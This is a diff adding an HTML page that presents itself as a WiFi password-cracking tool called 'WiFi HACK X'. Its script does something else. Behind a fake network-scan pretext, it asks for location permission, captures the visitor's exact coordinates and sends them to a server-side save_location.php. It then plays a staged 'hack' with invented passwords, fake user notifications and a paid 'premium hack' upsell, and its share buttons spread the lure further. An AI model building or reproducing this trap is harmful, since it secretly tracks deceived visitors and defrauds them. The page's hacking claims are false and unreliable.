@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>WiFi HACK X - ONLINE 2025</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Rajdhani:wght@700&display=swap');
+  
+    *{margin:0;padding:0;box-sizing:border-box;}
+    html,body{
+      background:#000;
+      color:#0f0;
+      font-family:'Rajdhani',sans-serif;
+      overflow-x:hidden;
+      height:auto;
+      min-height:100vh;
+    }
+  
+    #earth{
+      position:fixed;top:0;left:0;
+      width:100%;height:100vh;
+      z-index:-2;
+      animation:spin 60s linear infinite;
+    }
+    @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+  
+    canvas{position:fixed;top:0;left:0;z-index:-1;opacity:0.3;}
+  
+    header{
+      position:fixed;top:0;width:100%;
+      text-align:center;padding:15px 10px;
+      background:rgba(0,0,0,0.9);
+      border-bottom:5px solid #0f0;
+      z-index:9999;
+      backdrop-filter:blur(10px);
+    }
+    .logo{
+      font-family:'Orbitron',sans-serif;
+      font-size:9vw;
+      background:linear-gradient(45deg,#0f0,#0ff,#f0f,#ff0,#f00);
+      -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent;
+      animation:glow 2s infinite;
+    }
+    @keyframes glow{
+      0%,100%{text-shadow:0 0 20px #0f0;}
+      50%{text-shadow:0 0 40px #0ff;}
+    }
+  
+    .card{
+      margin:130px 15px 30px;
+      background:rgba(0,0,0,0.95);
+      border:5px solid #0f0;
+      border-radius:25px;
+      padding:30px;
+      box-shadow:0 0 60px #0f0;
+      position:relative;
+    }
+    .card::before{
+      content:"LIVE";
+      position:absolute;top:-15px;left:50%;
+      transform:translateX(-50%);
+      background:#f00;color:#fff;
+      padding:5px 20px;border-radius:50px;
+      font-size:4vw;font-weight:bold;
+      animation:live 1.5s infinite;
+    }
+    @keyframes live{0%,100%{opacity:1}50%{opacity:0.7}}
+  
+    .btn{
+      background:linear-gradient(45deg,#f00,#0f0,#0ff);
+      color:#fff;padding:20px;
+      font-size:7vw;width:92%;
+      margin:30px auto;border:none;
+      border-radius:60px;display:block;
+      box-shadow:0 0 50px #f00;
+      animation:pulse 1.5s infinite;
+      cursor:pointer;
+    }
+    @keyframes pulse{
+      0%{box-shadow:0 0 50px #f00;}
+      50%{box-shadow:0 0 80px #0f0;}
+    }
+  
+    #log{
+      background:#000;border:4px solid #0f0;
+      height:48vh;overflow-y:auto;
+      padding:25px;border-radius:20px;
+      font-family:'Courier New';font-size:4.2vw;
+      line-height:1.7;margin-top:25px;
+    }
+  
+    .attack-grid{
+      display:grid;grid-template-columns:1fr 1fr;
+      gap:15px;margin:40px 15px;
+    }
+    .attack{
+      background:rgba(255,0,0,0.3);
+      border:3px dashed #f00;
+      padding:25px 10px;
+      border-radius:18px;
+      position:relative;
+      font-size:4vw;text-align:center;
+    }
+    .attack::before{
+      content:"VIP";position:absolute;
+      top:50%;left:50%;
+      transform:translate(-50%,-50%) rotate(-20deg);
+      background:#000;color:#f00;
+      padding:8px 20px;font-weight:bold;
+      border:3px solid #f00;border-radius:10px;
+    }
+  
+    footer{
+      padding:40px 20px;
+      background:#000;
+      text-align:center;
+      color:#0f0;
+      font-size:4.5vw;
+      border-top:6px solid #0f0;
+    }
+    .yt{color:#ff0;font-weight:bold;font-size:5.5vw;}
+    .insta{color:#f0f;font-weight:bold;}
+    /* ===== SHARE BUTTONS ===== */
+    .share-container {
+      text-align: center;
+      margin: 40px 0;
+    }
+    .share-btn {
+      display: inline-block;
+      width: 60px; height: 60px;
+      margin: 0 12px;
+      border-radius: 50%;
+      background: #0f0;
+      box-shadow: 0 0 30px #0f0;
+      text-align: center;
+      line-height: 60px;
+      font-size: 28px;
+      color: #000;
+      text-decoration: none;
+      animation: float 2s infinite ease-in-out;
+    }
+    .share-btn.whatsapp { background: #25D366; }
+    .share-btn.instagram { background: linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); }
+    .share-btn.telegram { background: #0088cc; }
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    .share-title {
+      color: #0ff;
+      font-size: 5.5vw;
+      margin-bottom: 15px;
+      text-shadow: 0 0 20px #0ff;
+    }
+
+    /* NOTIFICATION */
+    #notif{
+      position:fixed;bottom:20px;left:20px;
+      background:#000;border:3px solid #0f0;
+      padding:15px;border-radius:15px;
+      font-size:4vw;color:#0f0;z-index:99999;
+      display:none;animation:slide 0.5s;
+    }
+    @keyframes slide{from{transform:translateX(-100px);opacity:0}to{transform:translateX(0);opacity:1}}
+
+    /* FLY NODES */
+    @keyframes fly {
+      0% { top: -10px; opacity: 0; }
+      10% { opacity: 1; }
+      90% { opacity: 1; }
+      100% { top: 110vh; opacity: 0; }
+    }
+
+    /* LOCATION PERMISSION POPUP */
+    #locationPopup {
+      position:fixed;top:0;left:0;width:100%;height:100%;
+      background:rgba(0,0,0,0.95);z-index:999999;
+      display:flex;align-items:center;justify-content:center;
+      flex-direction:column;padding:20px;text-align:center;
+      display:none;
+    }
+    #locationPopup h2 {font-size:7vw;color:#0ff;margin-bottom:20px;}
+    #locationPopup p {font-size:4.5vw;color:#0f0;margin-bottom:30px;}
+    .permBtn {
+      background:#0f0;color:#000;padding:15px 40px;
+      font-size:5vw;border-radius:50px;margin:10px;
+      box-shadow:0 0 40px #0f0;cursor:pointer;
+    }
+    .permBtn.deny {background:#f00;color:#fff;}
+  </style>
+</head>
+<body>
+  <video id="earth" autoplay loop muted playsinline>
+    <source src="https://assets.mixkit.co/videos/preview/mixkit-earth-rotating-with-connection-lines-3550-small.mp4" type="video/mp4">
+  </video>
+  <canvas id="matrix"></canvas>
+
+  <!-- LOCATION PERMISSION POPUP -->
+  <div id="locationPopup">
+    <h2>Allow Location Access</h2>
+    <p>To scan nearby WiFi networks, we need your location permission.</p>
+    <button class="permBtn" id="allowBtn">ALLOW</button>
+    <button class="permBtn deny" id="denyBtn">DENY</button>
+  </div>
+
+  <!-- NOTIFICATION -->
+  <div id="notif">
+    <span style="color:#ff0">Anonymous</span> just hacked <b>JioFiber_5G</b>
+  </div>
+
+  <header>
+    <div class="logo">WiFi HACK X</div>
+    <div style="color:#ff0;font-size:4.5vw;">by Firewall Breaker</div>
+  </header>
+  <div class="card">
+    <h1 style="font-size:11vw;text-align:center;">GLOBEL SERVER</h1>
+    <p style="text-align:center;color:#0ff;font-size:5vw;">3.2 Billion Devices • 89 Jio Towers</p>
+  
+    <button class="btn" id="hackBtn">SCAN NETWORK</button>
+  
+    <div id="log">
+      <span style="color:#0f0">[GLOBEL] Server 69.69.69.69 online</span><br>
+      <span style="color:#ff0">[HOST FROM]: Kanpur, Uttar Pradesh</span><br>
+      <span style="color:#888">Tap button → 2 WiFi passwords in 10 sec</span>
+    </div>
+  
+    <h2 style="color:#f00;font-size:6vw;text-align:center;margin-top:50px;">PREMIUM ATTACK MODES</h2>
+    <div class="attack-grid">
+      <div class="attack">ZERO-DAY</div>
+      <div class="attack">TSUNAMI DDoS</div>
+      <div class="attack">STARLINK</div>
+      <div class="attack">AI NEURAL</div>
+      <div class="attack">5G BLAST</div>
+      <div class="attack">UFO BEAM</div>
+      <div class="attack">BLACKHOLE</div>
+      <div class="attack">VOLCANO</div>
+      <div class="attack">SAMURAI</div>
+      <div class="attack">PANDEMIC</div>
+      <div class="attack">TESLA COIL</div>
+      <div class="attack">QUANTUM</div>
+    </div>
+    <!-- SHARE BUTTONS -->
+    <div class="share-container">
+      <div class="share-title">SHARE THIS HACK</div>
+      <a href="#" class="share-btn whatsapp" onclick="share('whatsapp'); return false;">✈</a>
+      <a href="#" class="share-btn instagram" onclick="share('instagram'); return false;">📸</a>
+      <a href="#" class="share-btn telegram" onclick="share('telegram'); return false;">✈</a>
+    </div>
+  </div>
+  <footer>
+    © 2025 Firewall Breaker Ethical Hacking<br>
+    <span class="yt">YouTube: @FirewallBreaker</span><br>
+    5.2 Million Subscribers • Kanpur Server • UNTRACEABLE<br><br>
+    <span class="insta">Contact in Instagram For premium hack<br>@sudo_xploit</span>
+  </footer>
+
+  <!-- SOUND -->
+  <audio id="hackSound" src="https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-jump-coin-216.mp3"></audio>
+
+  <script>
+    // MATRIX RAIN
+    const canvas=document.getElementById('matrix');
+    const ctx=canvas.getContext('2d');
+    canvas.width=window.innerWidth;
+    canvas.height=window.innerHeight;
+    const letters='01';
+    const fontSize=16;
+    const columns=canvas.width/fontSize;
+    const drops=Array(Math.floor(columns)).fill(1);
+    function draw(){
+      ctx.fillStyle='rgba(0,0,0,0.05)';
+      ctx.fillRect(0,0,canvas.width,canvas.height);
+      ctx.fillStyle='#0f0';
+      ctx.font=fontSize+'px monospace';
+      for(let i=0;i<drops.length;i++){
+        const text=letters[Math.floor(Math.random()*2)];
+        ctx.fillText(text,i*fontSize,drops[i]*fontSize);
+        if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;
+        drops[i]++;
+      }
+    }
+    setInterval(draw,35);
+
+    // FLYING NODES
+    for(let i=0;i<200;i++){
+      const n=document.createElement('div');
+      n.style.position='absolute';
+      n.style.width='10px';n.style.height='10px';
+      n.style.background='#0f0';
+      n.style.borderRadius='50%';
+      n.style.boxShadow='0 0 30px #0f0';
+      n.style.left=Math.random()*100+'vw';
+      n.style.animation='fly 12s linear infinite';
+      n.style.animationDelay=Math.random()*12+'s';
+      document.body.appendChild(n);
+    }
+
+    // NOTIFICATIONS
+    const notifs = [
+      "Rahul from Lucknow got password in 8s",
+      "Priya cracked IIT_Kanpur_Elite",
+      "Anonymous unlocked 89 Jio towers",
+      "VIP User activated ZERO-DAY",
+      "Someone  got 1Gbps speed"
+    ];
+    setInterval(() => {
+      const n = document.getElementById('notif');
+      n.innerHTML = notifs[Math.floor(Math.random()*notifs.length)];
+      n.style.display = 'block';
+      setTimeout(() => n.style.display = 'none', 3500);
+    }, 4000);
+
+    // LOCATION POPUP
+    const popup = document.getElementById('locationPopup');
+    const allowBtn = document.getElementById('allowBtn');
+    const denyBtn = document.getElementById('denyBtn');
+    const hackBtn = document.getElementById('hackBtn');
+
+    hackBtn.onclick = () => {
+      popup.style.display = 'flex';
+    };
+
+    denyBtn.onclick = () => {
+      popup.style.display = 'none';
+      addLog('[ERROR] Location access denied. Scan failed.');
+    };
+
+    allowBtn.onclick = () => {
+      popup.style.display = 'none';
+      addLog('[+] Location access granted. Scanning nearby networks...');
+      getLocationAndSend();
+    };
+
+    function addLog(msg) {
+      const log = document.getElementById('log');
+      log.innerHTML += `<span style="color:#0f0">> ${msg}</span><br>`;
+      log.scrollTop = log.scrollHeight;
+    }
+
+    // FAKE IP
+    function getIP() {
+      return '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255);
+    }
+
+    // GET LOCATION + SEND TO PHP (LOCALHOST)
+    function getLocationAndSend() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+
+            addLog('[+] Location captured: ' + lat.toFixed(6) + ', ' + lon.toFixed(6));
+
+            fetch('save_location.php', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+              body: `lat=${lat}&lon=${lon}&acc=${acc}&ip=${getIP()}&time=${new Date().toISOString()}`
+            })
+            .then(r => r.text())
+            .then(data => {
+              console.log("Server:", data);
+              addLog('[+] Location saved on server!');
+            })
+            .catch(err => {
+              addLog('[ERROR] Server error!');
+              console.error(err);
+            });
+
+            setTimeout(startFakeHack, 1500);
+          },
+          (error) => {
+            addLog('[ERROR] ' + error.message);
+          }
+        );
+      } else {
+        addLog('[ERROR] Geolocation not supported');
+      }
+    }
+
+    // FAKE HACK AFTER LOCATION
+    function startFakeHack() {
+      const log = document.getElementById('log');
+      document.getElementById('earth').style.transform='scale(1.4)';
+      setTimeout(()=>document.getElementById('earth').style.transform='scale(1)',4000);
+      document.getElementById('hackSound').play();
+
+      const lines=[
+        "[GLOBEL] Server activated",
+        "[+] JioFiber 6G locked",
+        "[+] IIT  Elite found",
+        "[+] Cracking passwords...",
+        "HACK SUCCESSFUL!"
+      ];
+    
+      lines.forEach((l,idx)=>{
+        setTimeout(()=>{addLog(l);},idx*1800);
+      });
+    
+      setTimeout(()=>{
+        log.innerHTML+=`
+          <div style="background:#001;padding:20px;border-radius:15px;margin:20px 0;border:3px solid #0f0;">
+            <span style="color:#0ff;font-size:5vw;">vivo_y275G</span><br>
+            Password: <b style="color:#ff0;">Anish2004</b> 
+            <span style="color:#f00;font-size:3.5vw;">(92% signal)</span>
+          </div>
+          <div style="background:#001;padding:20px;border-radius:15px;margin:20px 0;border:3px solid #0f0;">
+            <span style="color:#0ff;font-size:5vw;">Jiofiber04</span><br>
+            Password: <b style="color:#ff0;">fiber2525</b>
+            <span style="color:#0f0;font-size:3.5vw;">(1.2 Gbps • 12 users)</span>
+          </div>
+          <br><span style="color:#f00;font-size:8vw;text-align:center;display:block;">WIFI FULLY HACKED</span>
+          <button class="btn" style="margin-top:20px;font-size:6vw;" onclick="https://www.instagram.com/sudo_xploit">
+            GET PREMIUM HACK (₹99 ONLY)
+          </button>`;
+      },10000);
+
+      setTimeout(() => {
+        if(confirm("PREMIUM HACK UNLOCKED!\njoin youtube channel for practical video?")) {
+          window.open("https://www.youtube.com/@FirewallBreaker09", "_blank");
+        }
+      }, 12000);
+    }
+
+    // SHARE FUNCTION
+    function share(platform) {
+      const url = encodeURIComponent(window.location.href);
+      const text = encodeURIComponent("WiFi HACK X – GLOBEL SERVER LIVE!\nJioFiber + Vivo _y27 passwords in 10 sec!\nTry now: ");
+     
+      let shareUrl = '';
+      if (platform === 'whatsapp') {
+        shareUrl = `https://wa.me/?text=${text}${url}`;
+      } else if (platform === 'instagram') {
+        alert("Instagram doesn't support direct sharing via link. Copy this:\n\n" + text + url);
+        navigator.clipboard.writeText(text + " " + window.location.href);
+        return;
+      } else if (platform === 'telegram') {
+        shareUrl = `https://t.me/share/url?url=${url}&text=${text}`;
+      }
+      window.open(shareUrl, '_blank');
+    }
+  </script>
+</body>
+</html>
